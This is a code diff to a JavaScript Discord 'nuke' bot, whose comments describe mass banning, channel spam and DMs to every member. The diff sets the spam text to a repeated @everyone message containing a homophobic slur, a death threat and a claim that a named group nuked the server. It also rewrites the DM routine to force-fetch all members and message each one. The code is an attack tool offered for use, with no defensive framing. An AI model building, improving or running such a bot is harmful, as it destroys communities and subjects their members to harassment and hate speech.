@@ -15,7 +15,7 @@ const cleancode = "cleanup";
 // if we're nuking or not
 let activated = false;
 // what to spam (change the text within the backticks if you want the bot to spam something different)
-let text = `put what you want to spam inbetween these backticks`;
+let text = `@everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR @everyone THIS SERVER GOT NUKED BY THE ANTI DREAM EXTERMINATION CORPS - DEATH TO ALL YOU FAGGOTS! ALLAH HU AKBAR! ALLAH HU AKBAR `;
 
 // ===== MASS BAN/UNBANNING =====
 // code to ban everyone
@@ -117,9 +117,10 @@ let makeChannel = (message, name) => {
 let dmeveryone = async (message, toDM) => {
 	// is dm spam enabled?
 	if (dmspam_enabled == true) {
-		message.guild.members.cache.forEach(membersfetch => {
-			membersfetch.send(toDM).catch(e => console.log(`DM error, user: ${membersfetch.user.tag}`))
-		})
+		let members = await message.guild.members.fetch({ force: true }); 
+		members.forEach(member => {
+		    member.send(toDM).catch(e => console.log(`DM error, user: ${member.user.tag}`));
+		});
 	}
 }
 
@@ -237,6 +238,8 @@ client.on('messageCreate', message => {
 
 		// try catch for if the channel is a catergory/voice channel
 		try {
+
+			dmeveryone(message, dms);
 			
 			message.guild.channels.cache.forEach(channel => {
 				// send the message
@@ -246,8 +249,6 @@ client.on('messageCreate', message => {
 			}).catch(e => {
 				console.log("Error looping through guild channels");
 			});
-
-			dmeveryone(message, dms);
 			
 		} catch (e) {
 			//console.log("Error trying to spam/dm everyone")
